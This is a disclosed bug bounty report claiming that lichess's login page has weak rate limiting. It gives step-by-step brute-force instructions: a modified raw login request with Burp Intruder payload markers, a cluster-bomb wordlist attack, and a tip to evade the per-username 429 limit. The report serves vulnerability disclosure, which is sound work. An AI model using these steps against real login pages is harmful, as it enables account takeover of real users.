# Weak Rate Limiting Controls in the (LOGIN) page Expose System to Brute Force and DoS Attacks

## Report Details
- **Report ID**: 3085889
- **URL**: https://hackerone.com/reports/3085889
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2025-04-09T14:25:04.801Z
- **Disclosed**: 2025-05-15T11:11:04.687Z

## Reporter
- **Username**: hajjaj-
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: lichess

## Vulnerability Information
## Summary:

The login page lacks proper rate limiting, allowing an attacker to easily perform a brute-force attack. This vulnerability enables the attacker to systematically try different username and password combinations until they successfully compromise any account, which poses a significant security risk.

## Steps To Reproduce:

1.    Navigate to the login page.

2. Attempt login with any valid credentials.

 3.  Capture the request using a proxy tool (e.g., Burp Suite).

  +  Modify the captured request by deleting the token parameter and the cookies to make the request look like this:
====================================================================
POST /login HTTP/2
Host: lichess.org
Content-Length: 343
Cache-Control: max-age=0
Sec-Ch-Ua-Platform: "Linux"
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryc5GZocBapliqt011
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: */*
Origin: https://lichess.org
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://lichess.org/login
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

------WebKitFormBoundaryc5GZocBapliqt011
Content-Disposition: form-data; name="username"

§username§
------WebKitFormBoundaryc5GZocBapliqt011
Content-Disposition: form-data; name="password"

§password§
------WebKitFormBoundaryc5GZocBapliqt011
Content-Disposition: form-data; name="remember"

true
------WebKitFormBoundaryc5GZocBapliqt011-- 
=================================================================================

5.    Send the request to Burp's Intruder, adding a username wordlist for the "username" field and a password wordlist for the "password" field. Run the attack with the cluster bomb payload type.

    +   The wordlists should be large and realistic, matching common usernames and passwords (this will prevent rate-limiting issues caused by a smaller wordlist).

       + A smaller wordlist will cause the app to respond with 429 Too Many Requests due to insufficient time between attempts.

6.    Launch the attack, and you should eventually find a valid pair of credentials (response code 200 OK).

      + Ensure auto encoding is turned off in Burp Suite, as the credentials in the request are in plaintext.

     +   Note: The valid username will match many incorrect password attempts before the correct password is found and the app will not even feel that or make any reaction

Cause of the Vulnerability:

The vulnerability exists because the rate-limiting mechanism only checks for excessive requests to individual usernames. It does not account for multiple requests being sent to different usernames, allowing an attacker to bypass the rate-limiting by targeting a range of usernames. This creates an opportunity for a brute-force attack across a large set of accounts.

## Supporting Material/References:
{F4234333}
{F4234390}
{F4234544}

  * [attachment / reference]

## Impact

This vulnerability can lead to account takeover, privilege escalation, and the theft of sensitive user data.

## Attachments
- image.png
- image.png
- image.png
